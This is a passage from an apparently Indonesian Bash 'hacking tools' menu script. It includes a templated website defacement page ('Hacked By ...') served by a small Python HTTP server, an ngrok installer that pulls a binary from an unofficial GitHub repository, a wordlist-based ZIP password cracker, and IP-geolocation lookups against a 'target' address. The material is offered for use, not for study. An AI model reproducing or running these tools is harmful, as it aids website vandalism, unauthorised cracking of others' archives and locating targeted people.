    opacity: 0.5;  
}  
table {  
    position: relative;  
    z-index: 1;  
}
/* ininya nih↓ */
.audio-container {
    margin: 30px 0;
}
</style>  
<canvas id="matrix"></canvas>  
<table width="100%" height="100%">  
    <td align="center">  
        <img alt="#By.Thonxyzz404" src="$logo_url" width="400px">  
        <h2>Hacked By $defacer_name</h2>  
        <h4>
            <span style="color:red;">[</span>
            <span style="color:cyan;"> PERINGATAN </span>
            <span style="color:red;">]</span>
        </h4>   
        <div style="color:white; font-family: monospace;">
            ⊛════════════════════════════[ $defacer_name ]════════════════════════════⊛<br>  
            <span style="color:yellow;">$deface_text</span><br>  
            ⊛════════════════════════════[ Global-Team ]════════════════════════════⊛
        </div>
        <div class="audio-container">
            <audio controls="controls" src="$audio_url"></audio>  
        </div>
        <h4> <a href="https://t.me/+NlHuKTzhZbRkMTJl" >[ <font color="red">Anggota</font> ]<br>• By.Thonxyzz404 • By.$defacer_name • By.Pejuang_Kentang • By.Kenzi • By.TC20<br></h4>  
        <h3>[ <font color="red">Team-Global</font> ]<br>@ViewTech @Cyber_Anonymous @Draktor_team @Community_team</h3>  
</table>  
<script>  
const canvas = document.getElementById('matrix');  
const ctx = canvas.getContext('2d');  
canvas.height = window.innerHeight;  
canvas.width = window.innerWidth;  
const chars = '$matrix_text';  
const fontSize = 14;  
const columns = canvas.width / fontSize;  
const drops = [];  
for (let x = 0; x < columns; x++) {  
    drops[x] = 1;  
}  
function draw() {  
    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';  
    ctx.fillRect(0, 0, canvas.width, canvas.height);  
    ctx.fillStyle = '#0F0';  
    ctx.font = fontSize + 'px monospace';  
    for (let i = 0; i < drops.length; i++) {  
        const text = chars.charAt(Math.floor(Math.random() * chars.length));  
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);  
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {  
            drops[i] = 0;  
        }  
        drops[i]++;  
    }  
}  
setInterval(draw, 33);  
window.addEventListener('resize', () => {  
    canvas.height = window.innerHeight;  
    canvas.width = window.innerWidth;  
});  
</script>  
</body>  
</html>
EOF
cat > server.py <<'EOF'
from http.server import BaseHTTPRequestHandler, HTTPServer
import os
import sys
PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        path = self.path[1:] or "index.html"
        if os.path.exists(path):
            self.send_response(200)
            if path.endswith(".html"):
                self.send_header("Content-type", "text/html")
            elif path.endswith(".mp3"):
                self.send_header("Content-type", "audio/mpeg")
            else:
                self.send_header("Content-type", "application/octet-stream")
            self.end_headers()
            with open(path, "rb") as f:
                self.wfile.write(f.read())
        else:
            self.send_error(404, "File Not Found")
    def log_message(self, format, *args): return
if __name__ == "__main__":
    print(f"\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[32;1m Silakan Buka Deface Di : http://localhost:{PORT}\033[0m")
    httpd = HTTPServer(('0.0.0.0', PORT), Handler)
    httpd.serve_forever()
EOF
port=${1:-8080}
echo ""
echo -e "${r}[ ${g}+ ${r}]${y} Server Website Aktif Di : http://localhost:$port"
echo ""
python server.py $port
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
rm -f "$HOME/index.html" "$HOME/server.py"
clear
    ;;
       14)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
bold_bg='\033[41;1m'
bold_gren='\033[1;32m'
n='\033[0m'
cok="ansi-rounded"
ngrok="$HOME/ngrok"
if [ -d "$ngrok" ]; then
cd $ngrok
clear
cowsay -f eyes "By.Thonxyzz404" | boxes -d "$cok" | lolcat
echo ""
echo -e "${r}[ ${g}?? ${r}]${y} Pilih salah satu mthode ${r}[ ${g}http / tcp ${r}]"
echo -e "${g}"
read -p "localhost input mthode [ http - tcp ] : " manakocak
clear
cowsay -f eyes "By.Thonxyzz404" | boxes -d "$cok" | lolcat
echo ""
echo -e "${r}[ ${g}?? ${r}]${c} Masukkan prot anda bebas ${r}[ ${g}contoh : 8080 ${r}]"
echo -e "${c}"
read -p "localhost input mthode : " port
clear
echo "
⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⠷⠾⠛⠛⠛⠛⠷⠶⢶⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣴⡾⠛⠉⠁⠀⣰⡶⠶⠶⠶⠶⠶⣶⡄⠀⠉⠛⠿⣷⣄⡀⠀⠀⠀
⠀⠀⣠⣾⠟⠁⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⣼⠃⠀⠀⠀⠀⠈⠛⢿⣦⡀⠀
⢠⣼⠟⠁⠀⠀⠀⠀⣠⣴⣶⣿⡇⠀⠀⠀⠀⠀⣿⣷⣦⣄⠀⠀⠀⠀⠀⠙⣧⡀
⣿⡇⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣇⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⢈⣷
⣿⣿⣦⡀⣠⣾⣿⣿⣿⡿⠟⢻⣿⠀⠀⠀⠀⢠⣿⠻⢿⣿⣿⣿⣿⣆⣀⣠⣾⣿
⠉⠻⣿⣿⣿⣿⣽⡿⠋⠀⠀⠸⣿⠀⠀⠀⠀⢸⡿⠀⠀⠉⠻⣿⣿⣿⣿⣿⠟⠁
⠀⠀⠈⠙⠛⣿⣿⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⢸⣇⠀⠀⠀⠀⣹⣿⡟⠋⠁⠀⠀
⠀⠀⠀⠀⠀⢿⣿⣷⣄⣀⣴⣿⣿⣤⣤⣤⣤⣼⣿⣷⣀⣀⣾⣿⣿⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⣿⠟⠛⠛⠻⣿⣿⣿⣿⣿⡿⠛⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠁⣿⡇⠀⠀⠀⠀⢸⣿⡏⠙⠋⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣷⣄⠀⠀⣀⣾⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
" | boxes -d "$cok" | lolcat
echo ""
echo -e "${bold_bg}${bold_gren} NYALAKAN DULU HOTSPOT ANDA ${n}"
echo -e "${g}"
read -p "TEKAN ENTER UNTUK MEMULAI"
./ngrok $manakocak $port
break
else
clear
echo ""
echo -e "${r}[ ${g}++ ${r}]${c} SEDANG MENGINSTAL NGROK..!!"
sleep 2
echo -e "${n}"
cd $HOME
git clone --depth 32 https://github.com/Blackheat023/ngrok
cd ngrok
tar -xzvf ngrok-v3-stable-linux-arm64.tgz
clear
cowsay -f eyes "By.Thonxyzz404" | boxes -d "$cok" | lolcat
echo -e "${y}"
read -p "Masukkan AuthToken Ngrok Anda : " tokenlu
./ngrok config add-authtoken $tokenlu
clear
echo ""
echo -e "${bold_bg}${bold_gren} NGROK SUDAH TERINSTAL DI LENGKAPI DENGAN TOKEN ANDA ${n}"
sleep 5
fi
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
           read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
           clear
              ;;
       15)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
b='\033[34;1m'
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
p='\033[35;1m'
y='\033[33;1m'
n='\033[0m'
command -v unzip >/dev/null 2>&1 || { echo "Menginstall unzip..."; pkg install unzip -y; }
command -v figlet >/dev/null 2>&1 || { echo "Menginstall figlet..."; pkg install figlet -y; }
clear
echo ""
echo "
██╗   ██╗███╗   ██╗███████╗██╗██████╗     
██║   ██║████╗  ██║╚══███╔╝██║██╔══██╗    
██║   ██║██╔██╗ ██║  ███╔╝ ██║██████╔╝    
██║   ██║██║╚██╗██║ ███╔╝  ██║██╔═══╝     
╚██████╔╝██║ ╚████║███████╗██║██║         
 ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝╚═╝         
" | lolcat 
echo -e "${p}  Development ${g}: ${c}By.Thonxyzz404"
echo -e "${g}"
read -p "Masukkan file zip : " zipfile
echo -e "${y}"
read -p "Masukkan wordslit file anda : " wordlist
echo ""
[[ -z "$wordlist" ]] && wordlist="pass.txt"
if [[ ! -f "$zipfile" ]]; then
    echo -e "${r}[ ${g}X ${r}]${c} File ZIP tidak ditemukan..!!"
    echo ""
fi
if [[ ! -f "$wordlist" ]]; then
    echo -e "${r}[ ${g}X ${r}]${c} Wordlist tidak ditemukan..!!"
    echo ""
fi
words=$(wc -l < "$wordlist")
echo -e "${b}Cracking password please wait..!!"
echo ""
count=0
while IFS= read -r pass; do
    count=$((count + 1))
    echo -ne "\r${c}[ ${r}$count/$words ${c}]${y} Trying ${c}: ${g}$pass"
    unzip -P "$pass" -t "$zipfile" &>/dev/null
    if [[ $? -eq 0 ]]; then
        echo -e "\n\e[31m"
        figlet -f digital Cracked
        echo ""
        echo -e "${b}[ ${r}✓ ${b}]${y} Sukses password : $pass"
        echo ""
        exit 1
    fi
done < "$wordlist"
echo -e "${n}[ ${r}X ${n}]${g} Password not found, try another wordlist..!!"
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
              read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
              clear
              ;;
       16)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
              mpv --no-video --quiet "$HOME/Goblok/Y.mp3" &> /dev/null &
echo ""
echo "
██╗██████╗    ████████╗██████╗  █████╗  ██████╗██╗  ██╗
██║██╔══██╗   ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
██║██████╔╝█████╗██║   ██████╔╝███████║██║     █████╔╝ 
██║██╔═══╝ ╚════╝██║   ██╔══██╗██╔══██║██║     ██╔═██╗ 
██║██║           ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗
╚═╝╚═╝           ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
" | lolcat  
              echo -e "\033[33;1m╔══════════════════════════════╗"
              echo -e "\033[33;1m║\033[31;1m         TRACKING__IP      \033[33;1m   ║"
              echo -e "\033[33;1m╚══════════════════════════════╝"
              echo -e "\033[33;1m║\033[32;1m [ 01 ] TRACK V1   \033[33;1m           ║"
              echo -e "\033[33;1m║\033[32;1m [ 02 ] TRACK V2   \033[33;1m           ║"
              echo -e "\033[33;1m║\033[32;1m [ 03 ] TRACK V3   \033[33;1m           ║"
              echo -e "\033[33;1m║\033[32;1m [ 04 ] TRACK V4   \033[33;1m           ║"
              echo -e "\033[33;1m║\033[32;1m [ 05 ] TRACK V5   \033[33;1m           ║"
              echo -e "\033[33;1m║\033[31;1m [ 06 ] Kembali Ke Toolsv8!!  \033[33;1m║"
              echo -e "\033[33;1m╔══════════════════════════════╗"
              echo -e "\033[33;1m║\033[31;1m  PROJECTS BY : THONXYZZ404 \033[33;1m  ║"
              echo -e "\033[33;1m╚══════════════════════════════╝"
              echo -e "${blue}"
              read -p "Masukkan pilihan anda : " kuy
              case $kuy in
      1|01)
clear
figlet "TRACK IP ADDRESS" | lolcat
echo ""
echo ""
echo -e "${cyan}By.Thonxyzz404"
echo -e "${blue}====================="
echo -e "${green}[ 1.] Lacak IP"
echo -e "${red}[ 2.] Keluar"
echo -e "${blue}====================="
echo -e "${green}"
read -p "Pilih menu (1/2): " pilihan
echo ""
echo ""
track_ip_address() {
    read -p "Masukkan IP : " input_ip
    ip_info=$(curl -s "https://ipinfo.io/${input_ip}/json")
    ip_address=$(echo "$ip_info" | jq -r '.ip')
    hostname=$(echo "$ip_info" | jq -r '.hostname // "N/A"')
    city=$(echo "$ip_info" | jq -r '.city // "N/A"')
    region=$(echo "$ip_info" | jq -r '.region // "N/A"')
    country=$(echo "$ip_info" | jq -r '.country // "N/A"')
    loc=$(echo "$ip_info" | jq -r '.loc // "N/A"')
    org=$(echo "$ip_info" | jq -r '.org // "N/A"')
    timezone=$(echo "$ip_info" | jq -r '.timezone // "N/A"')
    asn=$(echo "$ip_info" | jq -r '.asn.asn // "N/A"')
    asn_name=$(echo "$ip_info" | jq -r '.asn.name // "N/A"')
    asn_domain=$(echo "$ip_info" | jq -r '.asn.domain // "N/A"')
    vpn=$(echo "$ip_info" | jq -r '.privacy.vpn // "false"')
    proxy=$(echo "$ip_info" | jq -r '.privacy.proxy // "false"')
    tor=$(echo "$ip_info" | jq -r '.privacy.tor // "false"')
    relay=$(echo "$ip_info" | jq -r '.privacy.relay // "false"')
    hosting=$(echo "$ip_info" | jq -r '.privacy.hosting // "false"')
    echo -e "${green}=================================================="
    echo -e "${yellow}Hasil scanning untuk IP : ${cyan}$ip_address"
    echo -e "${yellow}Hostname    : ${cyan}$hostname"
    echo -e "${yellow}Lokasi      : ${cyan}$city, $region, $country"
    echo -e "${yellow}Koordinat   : ${cyan}$loc"
    echo -e "${yellow}Organisasi  : ${cyan}$org"
    echo -e "${yellow}Timezone    : ${cyan}$timezone"
    echo -e "${yellow}ASN         : ${cyan}$asn"
    echo -e "${yellow}ASN Name    : ${cyan}$asn_name"
    echo -e "${yellow}ASN Domain  : ${cyan}$asn_domain"
    echo -e "${green}=================="
    echo -e "${red}Status Privasi"
    echo -e "${green}=================="
    echo -e "${yellow}VPN         : ${cyan}$vpn"
    echo -e "${yellow}Proxy       : ${cyan}$proxy"
    echo -e "${yellow}Tor         : ${cyan}$tor"
    echo -e "${yellow}Relay       : ${cyan}$relay"
    echo -e "${yellow}Hosting     : ${cyan}$hosting"
    echo -e "${green}================================================="
}
if [ "$pilihan" -eq 1 ]; then
  track_ip_address
elif [ "$pilihan" -ne 2 ]; then
  clear
fi
        echo""
        echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
        read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
        clear
         ;;
2|02)
clear
red='\033[0;31m'
hijau='\033[0;32m'
kuning='\033[0;33m'
biru='\033[0;34m'
purple='\033[0;35m'
cyan='\033[0;36m'
putih='\033[0;37m'
bgr='\033[41m'
bgh='\033[42m'
bgk='\033[43m'
bgb='\033[44m'
bgpurple='\033[45m'
bgc='\033[46m'
bgp='\033[47m'
banner() {
clear
echo -e "\033[0;31m        (                         )"
echo -e "\033[0;31m  *   ) )\ )    (        (     ( /(  "
echo -e "\033[0;31m  )  /((()/(    )\       )\    )\()) "
echo -e "\033[0;31m ( )(_))/(_))((((_)(   (((_) |((_)\  "
echo -e "\033[0;31m(_(_())(_))   )\ _ )\  )\___ |_ ((_) "
echo -e "\033[0;31m|_   _|| _ \  (_)_\(_)((/ __|| |/ /  "
echo -e "\033[0;31m  | |  |   /   / _ \   | (__     <   "
echo -e "\033[0;31m  |_|  |_|_\  /_/ \_\   \___| _|\_\  "
echo
echo -e "$red[$kuning•$red] $hijau Author$putih : By.Thonxyzz404"
echo -e "$red[$kuning•$red] $hijau Akun-tiktok : $putih@thonxyzz404"
}
menu() {
printf "\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m 01 \e[0m\e[1;31m]\e[0m\e[1;33m IP ANDA\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m 02 \e[0m\e[1;31m]\e[0m\e[1;33m TRACK IP\e[0m\n"
printf "\e[0m\e[1;31m  [\e[0m\e[1;37m 00 \e[0m\e[1;31m]\e[0m\e[1;33m KELUAR\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Select> \e[0m\e[1;96m: \e[0m\e[1;93m\en' option
if [[ $option == 1 || $option == 01 ]]; then
myipaddr
elif [[ $option == 2 || $option == 02 ]]; then
useripaddr
elif [[ $option == 0 || $option == 00 ]]; then
sleep 1
printf "\e[0m\n"
printf "\e[0m\n"
read -n 1 -s -r -p "Silahkan Tekan Enter Untuk Kluar"
clear
else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Salah goblok \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}
myipaddr() {
myipaddripapico=$(curl -s "https://ipapi.co//json" -L)
myipaddripapicom=$(curl -s "http://ip-api.com/json/" -L)
myip=$(echo $myipaddripapico | grep -Po '(?<="ip":)[^,]*' | tr -d '[]"')
mycity=$(echo $myipaddripapico | grep -Po '(?<="city":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
myregion=$(echo $myipaddripapico | grep -Po '(?<="region":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mycountry=$(echo $myipaddripapico | grep -Po '(?<="country_name":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mylat=$(echo $myipaddripapicom | grep -Po '(?<="lat":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mylon=$(echo $myipaddripapicom | grep -Po '(?<="lon":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mytime=$(echo $myipaddripapicom | grep -Po '(?<="timezone":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mypostal=$(echo $myipaddripapicom | grep -Po '(?<="zip":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
myisp=$(echo $myipaddripapico | grep -Po '(?<="org":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
myasn=$(echo $myipaddripapico | grep -Po '(?<="asn":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mycountrycode=$(echo $myipaddripapico | grep -Po '(?<="country_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mycurrency=$(echo $myipaddripapico | grep -Po '(?<="currency":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mylanguage=$(echo $myipaddripapico | grep -Po '(?<="languages":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
mycalling=$(echo $myipaddripapico | grep -Po '(?<="country_calling_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
banner
printf "\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Alamat Ip    \e[0m\e[1;96m:\e[0m\e[1;92m   $myip\e[0m\n"
printf "  \e[0m\e[1;93m  Kota         \e[0m\e[1;96m:\e[0m\e[1;92m   $mycity\e[0m\n"
printf "  \e[0m\e[1;93m  Wilayah      \e[0m\e[1;96m:\e[0m\e[1;92m   $myregion\e[0m\n"
printf "  \e[0m\e[1;93m  Negara       \e[0m\e[1;96m:\e[0m\e[1;92m   $mycountry\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Lintang      \e[0m\e[1;96m:\e[0m\e[1;92m    $mylat\e[0m\n"
printf "  \e[0m\e[1;93m  Bujur        \e[0m\e[1;96m:\e[0m\e[1;92m    $mylon\e[0m\n"
printf "  \e[0m\e[1;93m  Zona Waktu   \e[0m\e[1;96m:\e[0m\e[1;92m    $mytime\e[0m\n"
printf "  \e[0m\e[1;93m  Kode Pos     \e[0m\e[1;96m:\e[0m\e[1;92m    $mypostal\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  ISP          \e[0m\e[1;96m:\e[0m\e[1;92m   $myisp\e[0m\n"
printf "  \e[0m\e[1;93m  ASN          \e[0m\e[1;96m:\e[0m\e[1;92m   $myasn\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Kode Negara  \e[0m\e[1;96m:\e[0m\e[1;92m   $mycountrycode\e[0m\n"
printf "  \e[0m\e[1;93m  Mata Uang    \e[0m\e[1;96m:\e[0m\e[1;92m   $mycurrency\e[0m\n"
printf "  \e[0m\e[1;93m  Bahasa       \e[0m\e[1;96m:\e[0m\e[1;92m   $mylanguage\e[0m\n"
printf "  \e[0m\e[1;93m  Kode Panggil \e[0m\e[1;96m:\e[0m\e[1;92m   $mycalling\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Google Map   \e[0m\e[1;96m:\e[0m\e[1;94m  https://maps.google.com/?q=$mylat,$mylon\e[0m\n"
sleep 5
printf "\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m01\e[0m\e[1;91m]\e[0m\e[1;93m Kembali\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m02\e[0m\e[1;91m]\e[0m\e[1;93m Keluar\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31mSelect>\e[0m\e[1;96m  \en' mainorexit1
if [[ $mainorexit1 == 1 || $mainorexit1 == 01 ]]; then
banner
menu
elif [[ $mainorexit1 == 2 || $mainorexit1 == 02 ]]; then
printf "\e[0m\n"
printf "\e[0m\n"
read -n 1 -s -r -p "Silahkan Tekan Enter Untuk Kluar...!!"
clear 
else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Salah goblok \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}
useripaddr() {
banner
printf "\e[0m\n"
printf "\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31m[\e[0m\e[1;37m~\e[0m\e[1;31m]\e[0m\e[1;92m Ip Target \e[0m\e[1;96m: \e[0m\e[1;93m\en' useripaddress
ipaddripapico=$(curl -s "https://ipapi.co/$useripaddress/json" -L)
ipaddripapicom=$(curl -s "http://ip-api.com/json/$useripaddress" -L)
userip=$(echo $ipaddripapico | grep -Po '(?<="ip":)[^,]*' | tr -d '[]"')
usercity=$(echo $ipaddripapico | grep -Po '(?<="city":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
useregion=$(echo $ipaddripapico | grep -Po '(?<="region":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usercountry=$(echo $ipaddripapico | grep -Po '(?<="country_name":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userlat=$(echo $ipaddripapicom | grep -Po '(?<="lat":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userlon=$(echo $ipaddripapicom | grep -Po '(?<="lon":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usertime=$(echo $ipaddripapicom | grep -Po '(?<="timezone":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userpostal=$(echo $ipaddripapicom | grep -Po '(?<="zip":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userisp=$(echo $ipaddripapico | grep -Po '(?<="org":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userasn=$(echo $ipaddripapico | grep -Po '(?<="asn":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usercountrycode=$(echo $ipaddripapico | grep -Po '(?<="country_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usercurrency=$(echo $ipaddripapico | grep -Po '(?<="currency":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
userlanguage=$(echo $ipaddripapico | grep -Po '(?<="languages":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
usercalling=$(echo $ipaddripapico | grep -Po '(?<="country_calling_code":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
banner
printf "\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  IP target       \e[0m\e[1;96m:\e[0m\e[1;92m   $userip\e[0m\n"
printf "  \e[0m\e[1;93m  Kota            \e[0m\e[1;96m:\e[0m\e[1;92m   $usercity\e[0m\n"
printf "  \e[0m\e[1;93m  Wilayah         \e[0m\e[1;96m:\e[0m\e[1;92m   $useregion\e[0m\n"
printf "  \e[0m\e[1;93m  Negara          \e[0m\e[1;96m:\e[0m\e[1;92m   $usercountry\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Garis lintang   \e[0m\e[1;96m:\e[0m\e[1;92m    $userlat\e[0m\n"
printf "  \e[0m\e[1;93m  Bujur           \e[0m\e[1;96m:\e[0m\e[1;92m    $userlon\e[0m\n"
printf "  \e[0m\e[1;93m  Zona waktu      \e[0m\e[1;96m:\e[0m\e[1;92m    $usertime\e[0m\n"
printf "  \e[0m\e[1;93m  Kode pos        \e[0m\e[1;96m:\e[0m\e[1;92m    $userpostal\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  ISP             \e[0m\e[1;96m:\e[0m\e[1;92m   $userisp\e[0m\n"
printf "  \e[0m\e[1;93m  ASN             \e[0m\e[1;96m:\e[0m\e[1;92m   $userasn\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Kode negara     \e[0m\e[1;96m:\e[0m\e[1;92m   $usercountrycode\e[0m\n"
printf "  \e[0m\e[1;93m  Mata Uang       \e[0m\e[1;96m:\e[0m\e[1;92m   $usercurrency\e[0m\n"
printf "  \e[0m\e[1;93m  Bahasa          \e[0m\e[1;96m:\e[0m\e[1;92m   $userlanguage\e[0m\n"
printf "  \e[0m\e[1;93m  Kode panggilan  \e[0m\e[1;96m:\e[0m\e[1;92m   $usercalling\e[0m\n"
printf "\e[0m\n"
printf "  \e[0m\e[1;93m  Google map      \e[0m\e[1;96m:\e[0m\e[1;94m  https://maps.google.com/?q=$userlat,$userlon\e[0m\n"
sleep 5
printf "\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m 01 \e[0m\e[1;91m]\e[0m\e[1;93m Kembali\e[0m\n"
printf "  \e[0m\e[1;91m[\e[0m\e[1;97m 02 \e[0m\e[1;91m]\e[0m\e[1;93m Keluar\e[0m\n"
printf "\e[0m\n"
read -p $'  \e[1;31mSelect>\e[0m\e[1;96m  \en' mainorexit2
if [[ $mainorexit2 == 1 || $mainorexit2 == 01 ]]; then
banner
menu
elif [[ $mainorexit2 == 2 || $mainorexit2 == 02 ]]; then
printf "\e[0m\n"
printf "\e[0m\n"
else
printf " \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\e[1;93m Salah goblok \e[1;91m[\e[0m\e[1;97m!\e[0m\e[1;91m]\e[0m\n"
sleep 1
banner
menu
fi
}
banner
menu
          echo ""
              echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
              read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
              clear
                 ;;
      3|03)
clear 
RED='\033[0;31m'
WHITE='\033[1;37m'
BG_RED='\033[41m'
BG_BLUE='\033[44m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m' 
show_banner() {
  echo -e "${RED}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣬⣿⡽⣯⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣠⡺⠋⠁⠀⠈⣧⠙⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣔⣉⣤⣴⣿⣷⣤⣄⣀⢀⡏⠀⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠤⠄⠐⠺⢅⠀⠹⡾⣷⡿⢛⡛⡖⠒⢣⠀⠀⠀⠀
⠀⠀⠀⠀⢰⠺⣍⠉⠑⠊⠀⠀⠀⠀⠀⠀⠱⡀⢱⠛⠀⢇⣰⡼⣦⣈⡆⠀⠀⠀
⠀⠀⠀⠀⠘⢧⣘⣷⡀⠀⠀⠀⠀⠀⢀⣀⡀⣧⣸⠀⠀⢘⣧⣀⡇⠉⠁⢀⣀⠀
⠀⠀⠀⠀⠀⢨⠏⠈⢷⣀⣀⣠⠴⣊⣱⠀⠀⢹⣸⠴⢚⣽⢇⠉⠀⡠⢾⠿⡛⢳
